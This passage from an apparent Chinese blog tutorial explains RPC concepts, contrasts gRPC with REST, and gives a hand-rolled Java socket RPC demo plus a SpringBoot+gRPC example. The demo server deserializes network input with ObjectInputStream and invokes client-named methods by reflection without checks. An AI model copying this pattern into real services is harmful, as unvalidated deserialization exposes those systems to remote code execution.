Call）远程过程调用，简单的理解是一个节点请求另一个节点提供的服务</p><ol><li>首先客户端需要告诉服务器，需要调用的函数，这里函数和进程ID存在一个映射，客户端远程调用时，需要查一下函数，找到对应的ID，然后执行函数的代码。</li><li>客户端需要把本地参数传给远程函数，本地调用的过程中，直接压栈即可，但是在远程调用过程中不再同一个内存里，无法直接传递函数的参数，因此需要客户端把参数转换成字节流，传给服务端，然后服务端将字节流转换成自身能读取的格式，是一个序列化和反序列化的过程。</li><li>数据准备好了之后，如何进行传输？网络传输层需要把调用的ID和序列化后的参数传给服务端，然后把计算好的结果序列化传给客户端，因此TCP层即可完成上述过程，gRPC中采用的是HTTP2协议。</li></ol><p>总结一下：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// Client端 </span><br><span class="line">//    Student student = Call(ServerAddr, addAge, student)</span><br><span class="line">1. 将这个调用映射为Call ID。</span><br><span class="line">2. 将Call ID，student（params）序列化，以二进制形式打包</span><br><span class="line">3. 把2中得到的数据包发送给ServerAddr，这需要使用网络传输层</span><br><span class="line">4. 等待服务器返回结果</span><br><span class="line">5. 如果服务器调用成功，那么就将结果反序列化，并赋给student，年龄更新</span><br><span class="line"></span><br><span class="line">// Server端</span><br><span class="line">1. 在本地维护一个Call ID到函数指针的映射call_id_map，可以用Map&lt;String, Method&gt; callIdMap</span><br><span class="line">2. 等待客户端请求</span><br><span class="line">3. 得到一个请求后，将其数据包反序列化，得到Call ID</span><br><span class="line">4. 通过在callIdMap中查找，得到相应的函数指针</span><br><span class="line">5. 将student（params）反序列化后，在本地调用addAge()函数，得到结果</span><br><span class="line">6. 将student结果序列化后通过网络返回给Client</span><br></pre></td></tr></table></figure><ul><li>在微服务的设计中，一个服务A如果访问另一个Module下的服务B，可以采用HTTP REST传输数据，并在两个服务之间进行序列化和反序列化操作，服务B把执行结果返回过来。</li><li>由于HTTP在应用层中完成，整个通信的代价较高，远程过程调用中直接基于TCP进行远程调用，数据传输在传输层TCP层完成，更适合对效率要求比较高的场景，RPC主要依赖于客户端和服务端之间建立Socket链接进行，底层实现比REST更复杂。</li></ul><h3 id="RPC-demo"><a href="#RPC-demo" class="headerlink" title="RPC demo"></a>RPC demo</h3><p>客户端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RPCClient</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getRemoteProxyObj</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; serviceInterface, <span class="keyword">final</span> InetSocketAddress addr)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.将本地的接口调用转换成JDK的动态代理，在动态代理中实现接口的远程调用</span></span><br><span class="line">        <span class="keyword">return</span> (T) Proxy.newProxyInstance(serviceInterface.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;serviceInterface&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            <span class="comment">// 2.创建Socket客户端，根据指定地址连接远程服务提供者</span></span><br><span class="line">                            socket = <span class="keyword">new</span> <span class="title class_">Socket</span>();</span><br><span class="line">                            socket.connect(addr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 3.将远程服务调用所需的接口类、方法名、参数列表等编码后发送给服务提供者</span></span><br><span class="line">                            output = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(socket.getOutputStream());</span><br><span class="line">                            output.writeUTF(serviceInterface.getName());</span><br><span class="line">                            output.writeUTF(method.getName());</span><br><span class="line">                            output.writeObject(method.getParameterTypes());</span><br><span class="line">                            output.writeObject(args);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// 4.同步阻塞等待服务器返回应答，获取应答后返回</span></span><br><span class="line">                            input = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(socket.getInputStream());</span><br><span class="line">                            <span class="keyword">return</span> input.readObject();</span><br><span class="line">                        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (socket != <span class="literal">null</span>)&#123;</span><br><span class="line">                                socket.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (output != <span class="literal">null</span>)&#123;</span><br><span class="line">                                output.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (input != <span class="literal">null</span>)&#123;</span><br><span class="line">                                input.close();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceCenter</span> <span class="keyword">implements</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HashMap&lt;String, Class&gt; serviceRegistry = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">isRunning</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> port;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceCenter</span><span class="params">(<span class="type">int</span> port)</span>&#123;</span><br><span class="line">        ServiceCenter.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>();</span><br><span class="line">        server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(port));</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Start .....&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                executor.execute(<span class="keyword">new</span> <span class="title class_">ServiceTask</span>(server.accept()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            server.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Class serviceInterface, Class impl)</span> &#123;</span><br><span class="line">        serviceRegistry.put(serviceInterface.getName(), impl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isRunning</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isRunning;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPort</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        isRunning = <span class="literal">false</span>;</span><br><span class="line">        executor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServiceTask</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ServiceTask</span><span class="params">(Socket client)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.client = client;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                input = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(client.getInputStream());</span><br><span class="line">                <span class="type">String</span> <span class="variable">serviceName</span> <span class="operator">=</span> input.readUTF();</span><br><span class="line">                <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> input.readUTF();</span><br><span class="line">                Class&lt;?&gt;[] parameterTypes = (Class&lt;?&gt;[]) input.readObject();</span><br><span class="line">                Object[] arguments = (Object[]) input.readObject();</span><br><span class="line">                <span class="type">Class</span> <span class="variable">serviceClass</span> <span class="operator">=</span> serviceRegistry.get(serviceName);</span><br><span class="line">                <span class="keyword">if</span>(serviceClass == <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(serviceName + <span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> serviceClass.getMethod(methodName, parameterTypes);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(serviceClass.newInstance(), arguments);</span><br><span class="line"></span><br><span class="line">                output = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(client.getOutputStream());</span><br><span class="line">                output.writeObject(result);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(output!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        output.close();</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (input != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        input.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (client != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        client.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceProducerImpl</span> <span class="keyword">implements</span> <span class="title class_">ServiceProducer</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sendData</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I am service producer!!!, the data is &quot;</span>+ data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RPCTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Server</span> <span class="variable">serviceServer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceCenter</span>(<span class="number">8088</span>);</span><br><span class="line">                    serviceServer.register(ServiceProducer.class, ServiceProducerImpl.class);</span><br><span class="line">                    serviceServer.start();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="type">ServiceProducer</span> <span class="variable">service</span> <span class="operator">=</span> RPCClient.getRemoteProxyObj(ServiceProducer.class, <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8088</span>));</span><br><span class="line">        System.out.println(service.sendData(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h2><h3 id="gRPC与REST"><a href="#gRPC与REST" class="headerlink" title="gRPC与REST"></a>gRPC与REST</h3><ul><li>REST通常以业务为导向，将业务对象上执行的操作映射到HTTP动词，格式非常简单，可以使用浏览器进行扩展和传输，通过JSON数据完成客户端和服务端之间的消息通信，直接支持请求&#x2F;响应方式的通信。不需要中间的代理，简化了系统的架构，不同系统之间只需要对JSON进行解析和序列化即可完成数据的传递。</li><li>但是REST也存在一些弊端，比如只支持请求&#x2F;响应这种单一的通信方式，对象和字符串之间的序列化操作也会影响消息传递速度，客户端需要通过服务发现的方式，知道服务实例的位置，在单个请求获取多个资源时存在着挑战，而且有时候很难将所有的动作都映射到HTTP动词。</li><li>正是因为REST面临一些问题，因此可以采用gRPC作为一种替代方案，gRPC 是一种基于二进制流的消息协议，可以采用基于Protocol Buffer的IDL定义grpc API,这是Google公司用于序列化结构化数据提供的一套语言中立的序列化机制，客户端和服务端使用HTTP&#x2F;2以Protocol Buffer格式交换二进制消息。</li><li>gRPC的优势是，设计复杂更新操作的API非常简单，具有高效紧凑的进程通信机制，在交换大量消息时效率高，远程过程调用和消息传递时可以采用双向的流式消息方式，同时客户端和服务端支持多种语言编写，互操作性强；不过gRPC的缺点是不方便与JavaScript集成，某些防火墙不支持该协议。</li><li>注册中心：当项目中有很多服务时，可以把所有的服务在启动的时候注册到一个注册中心里面，用于维护服务和服务器之间的列表，当注册中心接收到客户端请求时，去找到该服务是否远程可以调用，如果可以调用需要提供服务地址返回给客户端，客户端根据返回的地址和端口，去调用远程服务端的方法，执行完成之后将结果返回给客户端。这样在服务端加新功能的时候，客户端不需要直接感知服务端的方法，服务端将更新之后的结果在注册中心注册即可，而且当修改了服务端某些方法的时候，或者服务降级服务多机部署想实现负载均衡的时候，我们只需要更新注册中心的服务群即可。<br><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/5.png"></li></ul><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>这里使用SpringBoot+gRPC的形式实现RPC调用过程 项目结构分为三部分：client、grpc、server</p><h4 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h4><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/6.png"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extensions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">extension</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>kr.motd.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>os-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.1.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xolstice.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">pluginId</span>&gt;</span>grpc-java<span class="tag">&lt;/<span class="name">pluginId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">protocArtifact</span>&gt;</span>com.google.protobuf:protoc:3.0.2:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">protocArtifact</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">pluginArtifact</span>&gt;</span>io.grpc:protoc-gen-grpc-java:1.2.0:exe:$&#123;os.detected.classifier&#125;<span class="tag">&lt;/<span class="name">pluginArtifact</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile-custom<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建.proto文件</p><figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;   <span class="comment">// 语法版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stub选项</span></span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">&quot;com.shgx.grpc.api&quot;</span>;</span><br><span class="line"><span class="keyword">option</span> java_outer_classname = <span class="string">&quot;RPCDateServiceApi&quot;</span>;</span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义包名</span></span><br><span class="line"><span class="keyword">package</span> com.shgx.grpc.api;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务接口定义，服务端和客户端都要遵守该接口进行通信</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">RPCDateService</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> getDate (RPCDateRequest) <span class="keyword">returns</span> (RPCDateResponse) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义消息（请求）</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RPCDateRequest</span> &#123;</span><br><span class="line">    <span class="type">string</span> userName = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义消息（响应）</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RPCDateResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> serverDate = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mvn complie</p><p>生成代码：<br><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/7.png"></p><h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/8.png"></p><p>根据gRPC中的项目配置在client和server两个Module的pom.xml添加依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.shgx<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写GRPCClient</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GRPCClient</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">serverPort</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ManagedChannel</span> <span class="variable">managedChannel</span> <span class="operator">=</span> ManagedChannelBuilder.forAddress( host, serverPort ).usePlaintext().build();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RPCDateServiceGrpc.<span class="type">RPCDateServiceBlockingStub</span> <span class="variable">rpcDateService</span> <span class="operator">=</span> RPCDateServiceGrpc.newBlockingStub( managedChannel );</span><br><span class="line">            <span class="type">RPCDateRequest</span> <span class="variable">rpcDateRequest</span> <span class="operator">=</span> RPCDateRequest</span><br><span class="line">                    .newBuilder()</span><br><span class="line">                    .setUserName(<span class="string">&quot;shgx&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">RPCDateResponse</span> <span class="variable">rpcDateResponse</span> <span class="operator">=</span> rpcDateService.getDate( rpcDateRequest );</span><br><span class="line">            System.out.println( rpcDateResponse.getServerDate() );</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            managedChannel.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/9.png"></p><p>按照2.2.3 client的方式添加依赖</p><p>创建RPCDateServiceImpl</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RPCDateServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">RPCDateServiceGrpc</span>.RPCDateServiceImplBase&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDate</span><span class="params">(RPCDateRequest request, StreamObserver&lt;RPCDateResponse&gt; responseObserver)</span> &#123;</span><br><span class="line">        <span class="type">RPCDateResponse</span> <span class="variable">rpcDateResponse</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Date now=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;今天是&quot;</span>+<span class="string">&quot;yyyy年MM月dd日 E kk点mm分&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">nowTime</span> <span class="operator">=</span> simpleDateFormat.format( now );</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rpcDateResponse = RPCDateResponse</span><br><span class="line">                    .newBuilder()</span><br><span class="line">                    .setServerDate( <span class="string">&quot;Welcome &quot;</span> + request.getUserName()  + <span class="string">&quot;, &quot;</span> + nowTime )</span><br><span class="line">                    .build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            responseObserver.onError(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            responseObserver.onNext( rpcDateResponse );</span><br><span class="line">        &#125;</span><br><span class="line">        responseObserver.onCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建GRPCServer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GRPCServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> ServerBuilder.</span><br><span class="line">                forPort(port)</span><br><span class="line">                .addService( <span class="keyword">new</span> <span class="title class_">RPCDateServiceImpl</span>() )</span><br><span class="line">                .build().start();</span><br><span class="line">        System.out.println( <span class="string">&quot;grpc服务端启动成功, 端口=&quot;</span> + port );</span><br><span class="line">        server.awaitTermination();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个优秀的RPC框架需要考虑的问题"><a href="#一个优秀的RPC框架需要考虑的问题" class="headerlink" title="一个优秀的RPC框架需要考虑的问题"></a>一个优秀的RPC框架需要考虑的问题</h2><ol><li><code>微服务化</code>应用都基于微服务化，实现资源调用离不开远程调用</li><li><code>多实例问题</code> 一个服务可能有多个实例，你在调用时，要如何获取这些实例的地址呢？— 